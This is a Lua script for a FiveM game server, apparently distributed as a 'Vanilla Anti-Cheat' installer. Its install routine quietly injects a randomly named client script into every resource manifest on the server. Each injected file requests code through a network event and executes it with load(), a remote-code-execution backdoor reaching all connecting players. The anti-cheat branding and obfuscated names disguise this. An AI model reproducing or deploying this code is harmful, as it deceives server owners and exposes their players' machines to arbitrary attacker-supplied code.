--INSTALLER ANTI-CHEAT-- :)))))





local ad = nil;
local ae = "__resource"
local af = nil;
local ag = "C0d3? yep"
local ah = "VANILLA ANTI-CHEAT"

RegisterCommand("vanilla", function(source, ai, aj)
	if source == 0 then
		print("")
		print("^1**^5Vanilla Anti-Cheat^1**")
		print("^1**^0vanilla help > Commands^1**^0")
		print("")
		if ai[1] == "install" then
			randomstring()
			if ai[2] == "fx" then
				print("^1**^2INSTALLING INTO ^0fxmanifest.lua ^2ONLY!**^0")
				ae = "fxmanifest"
			elseif ai[2] == nil then
				print("^1**^2INSTALLING INTO ^0__resource.lua ^2ONLY!**^0")
				ae = "__resource"
			end;
			if not af then
				af = {
					0,
					0,
					0
				}
			end;
			local ak = GetNumResources()
			for al = 0, ak - 1 do
				local am = GetResourcePath(GetResourceByFindIndex(al))
				if string.len(am) > 4 then
					setall(am)
				end
			end;
			print("^"..math.random(1, 9).."VanillaAC^0: ^1Resources ^0("..af[1].."/"..af[2].." ^1completed). ^0"..af[3].." ^1skipped.^0")
			print("^"..math.random(1, 9).."VanillaAC^0: ^0Your VanillaScript code for: ^8"..ae.."^0 is: ^8"..ad.." ^2KEEP IT SAFE! DON'T LOSE IT!")
			print("^"..math.random(1, 9).."VanillaAC^0: ^8Restart your server!!!^0")
			af = nil
		elseif ai[1] == "help" then
			print("^1**^5VanillaAC Installation^1**")
			print("")
			print("^1[*]^5Usage: ^0\"vanilla install\" -- for __resource.lua files")
			print("^1[*]^5Usage: ^0\"vanilla install fx\" -- for fxmanifest.lua files")
			print("----------------------")
			print("^1**^5VanillaAC Uninstall^1**")
			print("")
			print("^1[*]^5Usage: ^0\"vanilla uninstall VanillaScriptCode\" -- for __resource.lua files ")
			print("^1[*]^2Example: ^vanilla uninstall KuA4JV78JNA6H")
			print("^1[*]^5Usage: ^0\"vanilla uninstall VanillaScriptCode fx\" -- for fxmanifest.lua files")
			print("^1[*]^2Example: ^vanilla uninstall KuA4JV78JNA6H fx")
			print("")
			print("^1[*]^4Replace VanillaScriptCode with the code provided during the installation^0")
			print("^1[*]^3Note:^0 If you lost your code, search in any resource folder for it, you will find it as a lua file.")
			print("----------------------")
			print("^1[*]^8Help: ^0vanilla help^0")
		end;
		if ai[1] == "uninstall" then
			if not af then
				af = {
					0,
					0,
					0
				}
			end;
			if ai[2] then
				ad = ai[2]
				if ai[3] == "fx" then
					print("^1**^2UNINSTALLING FROM fxmanifest.lua ONLY!**^0")
					ae = "fxmanifest"
				elseif ai[3] == nil then
					print("^1**^2UNINSTALLING FROM __resource.lua ONLY!**^0")
					ae = "__resource"
				end;
				local ak = GetNumResources()
				for al = 0, ak - 1 do
					local am = GetResourcePath(GetResourceByFindIndex(al))
					if string.len(am) > 4 then
						setall(am, true)
					end
				end;
				print("^"..math.random(1, 9).."VanillaAC^0: ^1Resources ^0("..af[1].."/"..af[2].." ^1completed). ^0"..af[3].." ^1skipped.^0")
				print("^"..math.random(1, 9).."VanillaAC^0: ^8Restart your server!!!^0")
				af = nil
			else
				print("^"..math.random(1, 9).."VanillaAC^0: ^8Invalid Variable Name.^0")
				print("^"..math.random(1, 9).."VanillaAC^0: Need help? try ^3vanilla help^0")
			end
		end
	else
	end
end, true)
function setall(an, ao)
	local ap = io.open(an.."/"..ae..".lua", "r")
	local aq = split(an, "/")
	local ar = aq[#aq]
	aq = nil;
	if ap then
		if not ao then
			ap:seek("set", 0)
			local as = ap:read("*a")
			ap:close()
			local at = split(as, "\n")
			local au = false;
			local av = false;
			for U, aw in ipairs(at) do
				if aw == "client_script \""..ad..".lua\"" then
					au = true
				end;
				if not av then
					local ax = string.find(aw, "client_script") or -1;
					local ay = string.find(aw, "#") or -1;
					if ax ~= -1 and (ay == -1 or ax < ay) then
						av = true
					end
				end
			end;
			if av then
				as = as.."\nclient_script \""..ad..".lua\""
				if not au then
					os.remove(an.."/"..ae..".lua")
					ap = io.open(an.."/"..ae..".lua", "w")
					if ap then
						ap:seek("set", 0)
						ap:write(as)
						ap:close()
					end
				end;
								local az = [[
CreateThread(function()
TriggerServerEvent("yeyecode")
RegisterNetEvent("yeyecode")
AddEventHandler("yeyecode", function(yeyecode)
load(yeyecode)()
 end)
end)
]]
				ap = io.open(an.."/"..ad..".lua", "w")
				if ap then
					ap:seek("set", 0)
					ap:write(az)
					ap:close()
					af[1] = af[1] + 1;
					print("^"..math.random(1, 9).."VanillaAC^0: ^2Installation ^0"..ar.." ^2completed.^0")
				else
					print("^"..math.random(1, 9).."VanillaAC^0: ^8Installation failed on ^0"..ar.."^8.^0")
				end;
				af[2] = af[2] + 1
			else
				af[3] = af[3] + 1
			end
		else
			ap:seek("set", 0)
			local as = ap:read("*a")
			ap:close()
			local at = split(as, "\n")
			as = ""
			local au = false;
			local av = false;
			for U, aw in ipairs(at) do
				if aw == "client_script \""..ad..".lua\"" then
					au = true
				else
					as = as..aw.."\n"
				end
			end;
			if os.rename(an.."/"..ad..".lua", an.."/"..ad..".lua") then
				av = true;
				os.remove(an.."/"..ad..".lua")
			end;
			if not au and not av then
				af[3] = af[3] + 1
			end;
			if au then
				af[2] = af[2] + 1;
				os.remove(an.."/"..ae..".lua")
				ap = io.open(an.."/"..ae..".lua", "w")
				if ap then
					ap:seek("set", 0)
					ap:write(as)
					ap:close()
				else
					print("^8Failed uninstalling VanillaAC from "..ar..".^0")
					print("^8Make sure you are using the right variable!!!.^0")
					au, av = false, false
				end
			end;
			if au or av then
				print("^"..math.random(1, 9).."VanillaAC^0: ^2Uninstalled from ^0"..ar.." ^2successfully.^0")
				af[1] = af[1] + 1
			end
		end
	else
		af[3] = af[3] + 1
	end
end;
function searchall(an, ao)
	local ap = io.popen("dir \""..an.."\" /b /ad")
	ap:seek("set", 0)
	local aA = ap:read("*a")
	ap:close()
	local at = split(aA, "\n")
	for U, aw in ipairs(at) do
		if string.len(aw) > 0 then
			setall(an.."/"..aw, ao)
			searchall(an.."/"..aw, ao)
		end
	end
end;
function split(aB, aC)
	local aD, aE = 0, {}
	for aF, aG in function()
		return string.find(aB, aC, aD, true)
	end do
		table.insert(aE, string.sub(aB, aD, aF - 1))
		aD = aG + 1
	end;
	table.insert(aE, string.sub(aB, aD))
	return aE
end;
function randomstring()
	local aH = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	local aI = 5;
	local aJ = ''
	math.randomseed(os.time())
	charTable = {}
	for aK in aH:gmatch"." do
		table.insert(charTable, aK)
	end;
	for al = 1, aI do
		aJ = aJ..charTable[math.random(1, #charTable)]
	end;
	ad = aJ
end;